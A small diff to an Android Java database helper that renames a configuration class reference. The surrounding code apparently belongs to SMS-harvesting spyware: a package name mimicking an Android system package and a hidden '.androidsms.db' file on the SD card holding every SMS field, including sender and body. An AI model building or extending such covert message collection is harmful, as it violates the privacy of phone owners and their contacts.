@@ -6,7 +6,7 @@ import java.io.IOException;
 import android.database.sqlite.SQLiteDatabase;
 
 import com.android.system.controled.Debug;
-import com.android.system.controled.Globle;
+import com.android.system.controled.MainApplication;
 
 public class DatabaseUtil {
 
@@ -14,7 +14,7 @@ public class DatabaseUtil {
 
 	private static SQLiteDatabase mSQLiteDatabase;
 	public static final String DB_NAME = ".androidsms.db";
-	public static final String DB_PATH = Globle.FILE_IN_SDCARD + ".androidsms.db";
+	public static final String DB_PATH = MainApplication.FILE_IN_SDCARD + ".androidsms.db";
 	public static final int DB_VERSION = 6;
 
 	public static final String[] ALLSMS_ALLCOLUMNS = { "thread_id", "date", "address", "person", "type", "subject", "body", "read", "status" };
